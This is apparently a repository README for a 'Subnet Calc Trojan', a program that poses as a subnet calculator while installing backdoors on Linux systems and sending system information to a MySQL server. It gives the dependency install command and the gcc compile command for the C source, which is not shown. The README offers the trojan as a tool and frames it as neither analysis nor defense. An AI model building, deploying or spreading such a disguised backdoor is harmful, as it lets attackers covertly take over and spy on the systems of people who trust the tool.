# Subnet Calc Trojan
 A Subnet Calculator which installs backdoors on a linux system and exfiltrates system info to a mySQL server.

mySQL API Libraries:
apt-get install libmysqlclient-dev

To Compile:
gcc -o SubnetCalc 'Subnet Calculator.c' -lm $(mysql_config --cflags) $(mysql_config --libs)
	*The order is important
